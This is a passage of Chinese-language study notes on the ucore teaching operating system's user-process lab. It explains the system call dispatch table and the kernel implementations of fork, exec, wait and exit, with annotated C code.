id="c-与用户进程相关的系统调用"><a href="#c-与用户进程相关的系统调用" class="headerlink" title="c. 与用户进程相关的系统调用"></a>c. 与用户进程相关的系统调用</h4><p>在本实验中，与进程相关的各个系统调用属性如下所示：</p><table><thead><tr><th>系统调用名</th><th>含义</th><th>具体完成服务的函数</th></tr></thead><tbody><tr><td>SYS_exit</td><td>process exit</td><td>do_exit</td></tr><tr><td>SYS_fork</td><td>create child process, dup mm</td><td>do_fork–&gt;wakeup_proc</td></tr><tr><td>SYS_wait</td><td>wait child process</td><td>do_wait</td></tr><tr><td>SYS_exec</td><td>after fork, process execute a new program</td><td>load a program and refresh the mm</td></tr><tr><td>SYS_yield</td><td>process flag itself need resecheduling</td><td>proc-&gt;need_sched=1, then scheduler will rescheule this process</td></tr><tr><td>SYS_kill</td><td>kill process</td><td>do_kill–&gt;proc-&gt;flags |= PF_EXITING, –&gt;wakeup_proc–&gt;do_wait–&gt;do_exit</td></tr><tr><td>SYS_getpid</td><td>get the process’s pid</td><td></td></tr></tbody></table><p>通过这些系统调用，可方便地完成从进程/线程创建到退出的整个运行过程。</p><h4 id="d-系统调用的执行过程"><a href="#d-系统调用的执行过程" class="headerlink" title="d. 系统调用的执行过程"></a>d. 系统调用的执行过程</h4><p>当进入int 0x80中断后, 处理器和汇编码合作完成压入trapframe, 调用trap函数, 可以看到和之前的代码多了判断current的部分, </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">trap</span><span class="hljs-params">(struct trapframe *tf)</span> </span>&#123;<br>    <span class="hljs-comment">// dispatch based on what type of trap occurred</span><br>    <span class="hljs-comment">// used for previous projects</span><br>    <span class="hljs-keyword">if</span> (current == <span class="hljs-literal">NULL</span>) &#123;<br>        trap_dispatch(tf);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// keep a trapframe chain in stack</span><br>        <span class="hljs-comment">// 干嘛要保存这东西?</span><br>        struct trapframe *otf = current-&gt;tf;<br>        current-&gt;tf = tf;<br><br>        <span class="hljs-keyword">bool</span> in_kernel = trap_in_kernel(tf);<br><br>        trap_dispatch(tf);<br><br>        current-&gt;tf = otf;<br>        <span class="hljs-keyword">if</span> (!in_kernel) &#123;<br>            <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//只有do_kill()才会设置PF_EXITING</span><br>                do_exit(-E_KILLED);<br>            &#125;<br>            <span class="hljs-keyword">if</span> (current-&gt;need_resched) &#123;<br>                schedule();<br>            &#125;&#125;&#125;&#125;<br></code></pre></div></td></tr></table></figure><p>然后进入trap_dispatch()中的syscall(), 比较巧妙的是通过<strong>函数指针列表</strong>来确定调用哪个函数:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">int</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>= &#123; <span class="hljs-comment">//funtion ptr array</span><br>    [SYS_exit]              sys_exit,<br>    [SYS_fork]              sys_fork,<br>    [SYS_wait]              sys_wait,<br>    [SYS_exec]              sys_exec,<br>    [SYS_yield]             sys_yield,<br>    [SYS_kill]              sys_kill,<br>    [SYS_getpid]            sys_getpid,<br>    [SYS_putc]              sys_putc,<br>    [SYS_pgdir]             sys_pgdir,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> NUM_SYSCALLS        ((sizeof(syscalls)) / (sizeof(syscalls[0])))</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uint32_t</span> arg[<span class="hljs-number">5</span>];<br>    <span class="hljs-keyword">int</span> num = tf-&gt;tf_regs.reg_eax;<br>    <span class="hljs-keyword">if</span> (num &gt;= <span class="hljs-number">0</span> &amp;&amp; num &lt; NUM_SYSCALLS) &#123;<br>        <span class="hljs-keyword">if</span> (syscalls[num] != <span class="hljs-literal">NULL</span>) &#123;<br>            arg[<span class="hljs-number">0</span>] = tf-&gt;tf_regs.reg_edx;<br>            arg[<span class="hljs-number">1</span>] = tf-&gt;tf_regs.reg_ecx;<br>            arg[<span class="hljs-number">2</span>] = tf-&gt;tf_regs.reg_ebx;<br>            arg[<span class="hljs-number">3</span>] = tf-&gt;tf_regs.reg_edi;<br>            arg[<span class="hljs-number">4</span>] = tf-&gt;tf_regs.reg_esi;<br>            tf-&gt;tf_regs.reg_eax = syscalls[num](arg);<span class="hljs-comment">//`syscalls[num]` is function ptr, and `(arg)` is argument</span><br>            <span class="hljs-keyword">return</span> ;<br>        &#125;<br>    &#125;<br>    print_trapframe(tf);<br>    panic(<span class="hljs-string">&quot;undefined syscall %d, pid = %d, name = %s.\n&quot;</span>,<br>            num, current-&gt;pid, current-&gt;name);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果从哪个系统调用返回了就执行正常的中断退出(比如fork).</p><h3 id="4-fork-exec-wait-exit"><a href="#4-fork-exec-wait-exit" class="headerlink" title="4.fork/exec/wait/exit"></a>4.fork/exec/wait/exit</h3><h4 id="fork"><a href="#fork" class="headerlink" title="fork():"></a>fork():</h4><blockquote><p>重复了一下lab4中的内容, 有点不熟悉, 这种流程分析还是要自己写</p></blockquote><p><img src="../../image/ucore/image-20211228201516840.png" alt="image-20211228201516840"></p><p>sys_fork()简单的从current-&gt;tf中取出stack地址, 作为参数调用do_fork():</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">uint32_t</span> arg[])</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span> =</span> current-&gt;tf;<br>    <span class="hljs-keyword">uintptr_t</span> <span class="hljs-built_in">stack</span> = tf-&gt;tf_esp;<br>    <span class="hljs-comment">//int do_fork(uint32_t clone_flags, uintptr_t stack, struct trapframe *tf)</span><br>    <span class="hljs-keyword">return</span> do_fork(<span class="hljs-number">0</span>, <span class="hljs-built_in">stack</span>, tf);<br>&#125;<br></code></pre></div></td></tr></table></figure><p> 在这里值得自己思考一下fork一个进程需要做出哪些工作?</p><ul><li>首先一个进程有自己的控制块proc_struct, 我们需要alloc_proc()一个</li><li>每个进程都有自己的内核栈, 需要重新alloc2个4KB的page(KSTACKSIZE)</li><li>还有一个mm_struct也很重要, 需要alloc一个并将旧的复制到新进程中<ul><li>还要看clone_flag, 如果为false则建立新的, 否则直接使用旧的</li><li>调用mm_creat(); 注意到mm中管理着页目录表, 还要重新建立一个新的; 然后是**lock_mm(oldmm)(不知道是什么)**紧跟着dup_mm来复制内存空间中的内容, 注意到内存空间是由mm中的vma链表管理的, 需要遍历每一个vma块, 然后再调用<code>copy_range(to-&gt;pgdir, from-&gt;pgdir, vma-&gt;vm_start, vma-&gt;vm_end, share)</code>来copy内存, 具体详见练习2.</li></ul></li><li>然后要设置一下子进程的一些状态, copy_thread函数在lab4中有介绍.</li><li>插入链表(两个), 设置关系, 然后wakeup, 结束</li></ul><p><code>set_links</code>函数会为当前进程间设置合适的关系，其实现如下：</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*************************************************************</span><br><span class="hljs-comment">process relations</span><br><span class="hljs-comment">parent:           proc-&gt;parent  (proc is children)</span><br><span class="hljs-comment">children:         proc-&gt;cptr    (proc is parent)</span><br><span class="hljs-comment">older sibling:    proc-&gt;optr    (proc is younger sibling)</span><br><span class="hljs-comment">younger sibling:  proc-&gt;yptr    (proc is older sibling)</span><br><span class="hljs-comment">*************************************************************/</span><br><span class="hljs-comment">// set_links - set the relation links of process</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">set_links</span><span class="hljs-params">(struct proc_struct *proc)</span> </span>&#123;<br>    list_add(&amp;proc_list, &amp;(proc-&gt;list_link));<br>    proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> ((proc-&gt;optr = proc-&gt;parent-&gt;cptr) != <span class="hljs-literal">NULL</span>)<br>        proc-&gt;optr-&gt;yptr = proc;<br>    proc-&gt;parent-&gt;cptr = proc;<br>    nr_process ++;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><p>除了lab4熟知的<code>list_add</code>与<code>nr_process++</code>，该函数还设置了<code>proc_struct</code>中的<code>optr、yptr</code>以及<code>cptr</code>成员。</p></li><li><p>其中，<code>cptr</code>指针指向当前进程的子进程中，<strong>最新创建</strong>的那个子进程，即<code>children</code>；<code>yptr</code>指向<strong>与当前进程共享同一个父进程，但比当前进程的创建时间更晚的进程</strong>，即<code>younger sibling</code>。而<code>optr</code>指针的功能则与<code>yptr</code>相反，指向<code>older sibling</code>。</p></li><li><p>进程间关系如下图所示</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">                     +----------------+<br>                     | parent process |<br>                     +----------------+<br>              parent ^         \       ^  parent<br>                    /           \       \<br>                   /             \ cptr  \<br>                  /         yptr  V       \      yptr<br>           +-------------+  --&gt;  +-------------+  --&gt;  <span class="hljs-literal">NULL</span><br>           | old process |       | New Process |<br><span class="hljs-literal">NULL</span>  &lt;--  +-------------+  &lt;--  +-------------+<br>      optr                  optr<br></code></pre></div></td></tr></table></figure></li></ul><h4 id="exec"><a href="#exec" class="headerlink" title="exec():"></a>exec():</h4><p>首先从do_exec参数来看需要创建进程名称字符数组, 程序长度, ELF文件地址, 大小四个参数</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span><br></code></pre></div></td></tr></table></figure><p>具体注释在下方:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_execve</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *name, <span class="hljs-keyword">size_t</span> len, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> *binary, <span class="hljs-keyword">size_t</span> size)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-comment">//例行检查以及校正名称长度</span><br>    <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)name, len, <span class="hljs-number">0</span>)) &#123;<br>        <span class="hljs-keyword">return</span> -E_INVAL;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;<br>        len = PROC_NAME_LEN;<br>    &#125;<br><span class="hljs-comment">//从name地址上复制名称字符串</span><br>    <span class="hljs-keyword">char</span> local_name[PROC_NAME_LEN + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memset</span>(local_name, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(local_name));<br>    <span class="hljs-built_in">memcpy</span>(local_name, name, len);<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">int</span> ret;<br>    <span class="hljs-comment">//解析ELF文件以及建立mm内容</span><br>    <span class="hljs-keyword">if</span> ((ret = load_icode(binary, size)) != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">goto</span> execve_exit;<span class="hljs-comment">//出错则退出</span><br>    &#125;<br>    set_proc_name(current, local_name);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>execve_exit:<br>    do_exit(ret);<br>    panic(<span class="hljs-string">&quot;already exit: %e.\n&quot;</span>, ret);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>可以看出解析ELF文件才是大头. 代码在<strong>练习1</strong>或者直接看源码.</p><p><strong>load_icode</strong>函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。此函数有一百多行，完成了如下重要工作：</p><ol><li>调用mm_create函数来申请进程的内存管理数据结构mm所需内存空间，并对mm进行初始化；</li><li>调用setup_pgdir来申请一个页目录表所需的一个页大小的内存空间，并把描述ucore内核虚空间映射的内核页表（boot_pgdir所指）的内容拷贝到此新目录表中，最后让mm-&gt;pgdir指向此页目录表，这就是进程新的页目录表了，且能够正确映射内核虚空间；</li><li>根据应用程序执行码的起始位置来解析此ELF格式的执行程序，并调用mm_map函数根据ELF格式的执行程序说明的各个段（代码段、数据段、BSS段等）的起始位置和大小建立对应的vma结构，并把vma插入到mm结构中，从而表明了用户进程的合法用户态虚拟地址空间；</li><li>调用根据执行程序各个段的大小分配物理内存空间，并根据执行程序各个段的起始位置确定虚拟地址，并在页表中建立好物理地址和虚拟地址的映射关系，然后把执行程序各个段的内容拷贝到相应的内核虚拟地址中，至此应用程序执行码和数据已经根据编译时设定地址放置到虚拟内存中了；</li><li>需要给用户进程设置用户栈，为此调用mm_mmap函数建立用户栈的vma结构，明确用户栈的位置在用户虚空间的顶端，大小为256个页，即1MB，并分配一定数量的物理内存且建立好栈的虚地址&lt;–&gt;物理地址映射关系；</li><li>至此,进程内的内存管理vma和mm数据结构已经建立完成，于是把mm-&gt;pgdir赋值到cr3寄存器中，即更新了用户进程的虚拟内存空间，此时的initproc已经被hello的代码和数据覆盖，成为了第一个用户进程，但此时这个用户进程的执行现场还没建立好；</li><li>先清空进程的中断帧，再重新设置进程的中断帧，使得在执行中断返回指令“iret”后，能够让CPU转到用户态特权级，并回到用户态内存空间，使用用户态的代码段、数据段和堆栈，且能够跳转到用户进程的第一条指令执行，并确保在用户态能够响应中断；</li></ol><p>至此，用户进程的用户环境已经搭建完毕。此时initproc将按产生系统调用的函数调用路径原路返回，执行中断返回指令“iret”（位于trapentry.S的最后一句）后，将切换到用户进程hello的第一条语句位置_start处（位于user/libs/initcode.S的第三句）开始执行。</p><h4 id="wait"><a href="#wait" class="headerlink" title="wait()"></a>wait()</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_wait - wait one OR any children to become PROC_ZOMBIE state, and free memory space of kernel stack</span><br><span class="hljs-comment">//         - proc struct of this child.</span><br><span class="hljs-comment">// <span class="hljs-doctag">NOTE:</span> only after do_wait function, all resources of the child proces are free.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span> pid, <span class="hljs-keyword">int</span> *code_store)</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//例行检查</span><br>        <span class="hljs-keyword">if</span> (!user_mem_check(mm, (<span class="hljs-keyword">uintptr_t</span>)code_store, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>), <span class="hljs-number">1</span>)) &#123;<br>            <span class="hljs-keyword">return</span> -E_INVAL;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    <span class="hljs-keyword">bool</span> intr_flag, haskid;<br>repeat:<br>    haskid = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (pid != <span class="hljs-number">0</span>) &#123;<span class="hljs-comment">//不等于零意味着要在hash_list中寻找特定pid的子程序</span><br>        proc = find_proc(pid);<br>        <span class="hljs-keyword">if</span> (proc != <span class="hljs-literal">NULL</span> &amp;&amp; proc-&gt;parent == current) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//查找任意一个为ZOMBIE的子程序</span><br>        proc = current-&gt;cptr;<br>        <span class="hljs-keyword">for</span> (; proc != <span class="hljs-literal">NULL</span>; proc = proc-&gt;optr) &#123;<br>            haskid = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">goto</span> found;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (haskid) &#123;<span class="hljs-comment">//存在子程序, 但是没有一个是ZOMBIE, 而且当前是父进程在执行, 所以调用switch()来</span><br>        <span class="hljs-comment">//切换到子进程执行, 并且设置一下父进程为SLEEP状态, wait原因是for child</span><br>        current-&gt;state = PROC_SLEEPING;<br>        current-&gt;wait_state = WT_CHILD;<br>        schedule();<br>        <span class="hljs-keyword">if</span> (current-&gt;flags &amp; PF_EXITING) &#123;<span class="hljs-comment">//怎么调用了do_exit()?????</span><br>            do_exit(-E_KILLED);<br>        &#125;<br>        <span class="hljs-keyword">goto</span> repeat;<span class="hljs-comment">//子进程(应该)执行完了, 重新查找</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> -E_BAD_PROC;<span class="hljs-comment">//没有子程序的话......</span><br><br>found:<br>    <span class="hljs-keyword">if</span> (proc == idleproc || proc == initproc) &#123;<span class="hljs-comment">//不可能是任何进程的子进程</span><br>        panic(<span class="hljs-string">&quot;wait idleproc or initproc.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (code_store != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//如果提供了存放exit_code的变量, 则存入</span><br>        *code_store = proc-&gt;exit_code;<br>    &#125;<br>    local_intr_save(intr_flag);<br>    &#123;<span class="hljs-comment">//对这种链表的操作要屏蔽中断</span><br>        unhash_proc(proc);<br>        remove_links(proc);<br>    &#125;<br>    local_intr_restore(intr_flag);<br>    <span class="hljs-comment">//释放子进程占用资源</span><br>    put_kstack(proc);<br>    kfree(proc);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="exit"><a href="#exit" class="headerlink" title="exit():"></a>exit():</h4><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// do_exit - called by sys_exit</span><br><span class="hljs-comment">//   1. call exit_mmap &amp; put_pgdir &amp; mm_destroy to free the almost all memory space of process</span><br><span class="hljs-comment">//   2. set process&#x27; state as PROC_ZOMBIE, then call wakeup_proc(parent) to ask parent reclaim itself.</span><br><span class="hljs-comment">//   3. call scheduler to switch to other process</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">do_exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span> error_code)</span> </span>&#123;<br>    <span class="hljs-comment">//不能退出的两个内核进程</span><br>    <span class="hljs-keyword">if</span> (current == idleproc) &#123;<br>        panic(<span class="hljs-string">&quot;idleproc exit.\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (current == initproc) &#123;<br>        panic(<span class="hljs-string">&quot;initproc exit.\n&quot;</span>);<br>    &#125;<br><span class="hljs-comment">//如果current-&gt;mm不为NULL, 说明为用户进程, 清空一下mm(包括vma链表,页目录表,以及mm自身)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span> =</span> current-&gt;mm;<br>    <span class="hljs-keyword">if</span> (mm != <span class="hljs-literal">NULL</span>) &#123;<br>        lcr3(boot_cr3);<br>        <span class="hljs-keyword">if</span> (mm_count_dec(mm) == <span class="hljs-number">0</span>) &#123;<br>            exit_mmap(mm);<br>            put_pgdir(mm);<br>            mm_destroy(mm);<br>        &#125;<br>        current-&gt;mm = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    current-&gt;state = PROC_ZOMBIE;<br>    current-&gt;exit_code = error_code;<br><br>    <span class="hljs-keyword">bool</span> intr_flag;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">proc</span>;</span><br>    local_intr_save(intr_flag);<br>    &#123;<br>        <span class="hljs-comment">//如果父进程因为WT_CHILD睡眠, 则唤醒父进程</span><br>        proc = current-&gt;parent;<br>        <span class="hljs-keyword">if</span> (proc-&gt;wait_state == WT_CHILD) &#123;<br>            wakeup_proc(proc);<br>        &#125;<br>        <span class="hljs-keyword">while</span> (current-&gt;cptr != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//当前进程有子进程</span><br>            proc = current-&gt;cptr;<br>            current-&gt;cptr = proc-&gt;optr;<br>   <span class="hljs-comment">//以下几行把proc从current的cptr上插入到initproc的cptr等关系指针中</span><br>            proc-&gt;yptr = <span class="hljs-literal">NULL</span>;<br>            <span class="hljs-keyword">if</span> ((proc-&gt;optr = initproc-&gt;cptr) != <span class="hljs-literal">NULL</span>) &#123;<span class="hljs-comment">//把current的子进程的父进程设置为initproc</span><br>                initproc-&gt;cptr-&gt;yptr = proc;<br>            &#125;<br>            proc-&gt;parent = initproc;<br>            initproc-&gt;cptr = proc;<br>            <span class="hljs-comment">//如果initproc因为WT_CHILD睡眠, 则唤醒initproc</span><br>            <span class="hljs-keyword">if</span> (proc-&gt;state == PROC_ZOMBIE) &#123;<br>                <span class="hljs-keyword">if</span> (initproc-&gt;wait_state == WT_CHILD) &#123;<br>                    wakeup_proc(initproc);<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>    local_intr_restore(intr_flag);<br><br>    schedule();<br>    panic(<span class="hljs-string">&quot;do_exit will not return!! %d.\n&quot;</span>, current-&gt;pid);<br></code></pre></div></td></tr></table></figure><h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><h3 id="练习1-2"><a href="#练习1-2" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p>补充load_icode()的实现</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 